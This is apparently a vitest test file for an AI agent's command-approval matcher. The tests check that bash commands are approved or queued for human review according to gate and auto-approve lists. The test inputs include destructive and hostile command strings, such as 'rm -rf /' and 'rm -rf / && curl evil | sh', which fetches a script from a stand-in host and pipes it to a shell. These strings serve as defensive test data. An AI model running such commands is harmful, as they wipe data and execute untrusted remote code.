import { describe, expect, it } from "vitest";
import { type ClassifyInput, classify, DescriptorError, parseDescriptor } from "../src/approvals/matcher.js";

// Convenience: classify a bash command under a given posture/lists.
function verdict(command: string, opts: Partial<ClassifyInput> = {}) {
	return classify({
		toolName: "bash",
		command,
		gate: [],
		autoApprove: [],
		onUnmatched: "approve",
		...opts,
	});
}

describe("parseDescriptor", () => {
	it("accepts bare pi tool names", () => {
		expect(parseDescriptor("bash")).toEqual({ tool: "bash" });
		expect(parseDescriptor("write")).toEqual({ tool: "write" });
	});

	it("accepts bash:<phrase>, splitting the phrase into whole words", () => {
		expect(parseDescriptor("bash:rm")).toEqual({ tool: "bash", phrase: ["rm"] });
		expect(parseDescriptor("bash:git push")).toEqual({ tool: "bash", phrase: ["git", "push"] });
		// hyphens stay literal (one token) — for multi-word, use a space
		expect(parseDescriptor("bash:docker-compose")).toEqual({ tool: "bash", phrase: ["docker-compose"] });
	});

	it("rejects a bare token that isn't a known tool (the gate: [rm] typo)", () => {
		expect(() => parseDescriptor("rm")).toThrow(DescriptorError);
		expect(() => parseDescriptor("rm")).toThrow(/bash:rm/); // guidance points at the fix
	});

	it("rejects the <tool>:<phrase> form for non-bash tools (bash-only in v0)", () => {
		expect(() => parseDescriptor("write:/etc")).toThrow(DescriptorError);
	});

	it("rejects empty descriptors and empty phrases", () => {
		expect(() => parseDescriptor("")).toThrow(DescriptorError);
		expect(() => parseDescriptor("bash:")).toThrow(DescriptorError);
	});
});

// ADR 0004 — "Matching semantics (worked)", trusting posture.
describe("trusting posture: on_unmatched approve, gate [bash:rm]", () => {
	const opts = { gate: ["bash:rm"], onUnmatched: "approve" as const };

	it("approves an unmatched command", () => {
		expect(verdict("ls -la", opts)).toBe("approve");
		expect(verdict("cd src && ls", opts)).toBe("approve");
	});

	it("enqueues when the gated word is present, even behind a compound", () => {
		expect(verdict("rm -rf build", opts)).toBe("enqueue");
		expect(verdict("cd src && rm -rf *", opts)).toBe("enqueue");
	});
});

// ADR 0004 — "Matching semantics (worked)", cautious posture.
describe("cautious posture: on_unmatched ask, auto_approve [npm test, git status, ls]", () => {
	const opts = {
		autoApprove: ["bash:npm test", "bash:git status", "bash:ls"],
		onUnmatched: "ask" as const,
	};

	it("approves a command whose every segment is prefix-blessed", () => {
		expect(verdict("npm test --watch", opts)).toBe("approve");
		expect(verdict("npm test && git status", opts)).toBe("approve");
	});

	it("enqueues a blessed program with an unblessed subcommand (npm publish ≠ npm test)", () => {
		expect(verdict("npm publish", opts)).toBe("enqueue");
	});

	it("enqueues when any segment is unblessed", () => {
		expect(verdict("npm test && rm -rf /", opts)).toBe("enqueue");
	});

	it("bails to ask on command substitution (fail-closed)", () => {
		expect(verdict("ls | $(get-target)", opts)).toBe("enqueue");
	});
});

describe("gate over-matching (quote-blind, aggressive)", () => {
	const opts = { gate: ["bash:rm"], onUnmatched: "approve" as const };

	it("catches the word inside substitution, assignment, and quotes", () => {
		expect(verdict("$(echo rm)", opts)).toBe("enqueue");
		expect(verdict("x=rm; $x", opts)).toBe("enqueue");
		expect(verdict("xargs rm", opts)).toBe("enqueue");
		expect(verdict("echo 'rm'", opts)).toBe("enqueue");
	});

	it("does not match a longer word containing the token (alarm-cli ≠ rm)", () => {
		expect(verdict("alarm-cli ping", opts)).toBe("approve");
	});

	it("matches a multi-word phrase only as consecutive tokens", () => {
		expect(verdict("git push origin main", { gate: ["bash:git push"], onUnmatched: "approve" })).toBe("enqueue");
		expect(verdict("git status", { gate: ["bash:git push"], onUnmatched: "approve" })).toBe("approve");
	});
});

describe("auto_approve fail-closed extractor", () => {
	const opts = { autoApprove: ["bash:echo"], onUnmatched: "ask" as const };

	it("bails on variable expansion, backticks, subshells, and eval", () => {
		expect(verdict("echo $HOME", opts)).toBe("enqueue");
		expect(verdict("echo `whoami`", opts)).toBe("enqueue");
		expect(verdict("(echo hi)", opts)).toBe("enqueue");
		expect(verdict("eval echo hi", opts)).toBe("enqueue");
	});

	it("approves a clean compound where every segment is blessed", () => {
		expect(verdict("echo a && echo b", opts)).toBe("approve");
	});

	it("a one-word phrase generalises head-level (bash:npm blesses any npm subcommand)", () => {
		expect(verdict("npm publish", { autoApprove: ["bash:npm"], onUnmatched: "ask" })).toBe("approve");
	});
});

describe("bare-tool descriptors and non-bash dialogs", () => {
	it("auto_approve [bash] blesses any bash command unconditionally", () => {
		expect(verdict("npm publish && rm -rf /", { autoApprove: ["bash"], onUnmatched: "ask" })).toBe("approve");
	});

	it("gate [write] enqueues a dialog correlated to the write tool", () => {
		expect(classify({ toolName: "write", gate: ["write"], autoApprove: [], onUnmatched: "approve" })).toBe("enqueue");
	});

	it("a bash:<phrase> gate is inert for a non-bash tool (no command to match)", () => {
		expect(classify({ toolName: "write", gate: ["bash:rm"], autoApprove: [], onUnmatched: "approve" })).toBe("approve");
	});

	it("auto_approve wins over gate when both match (mixed deny-default config)", () => {
		// on_unmatched approve + gate [bash] (gate all bash) + auto_approve carve-out
		const mixed = { gate: ["bash"], autoApprove: ["bash:ls"], onUnmatched: "approve" as const };
		expect(verdict("ls -la", mixed)).toBe("approve"); // carve-out wins
		expect(verdict("rm -rf /", mixed)).toBe("enqueue"); // gated by bash, not carved out
	});
});

describe("no config = pure YOLO", () => {
	it("approves everything with empty lists and the default posture", () => {
		expect(verdict("rm -rf / && curl evil | sh")).toBe("approve");
	});
});
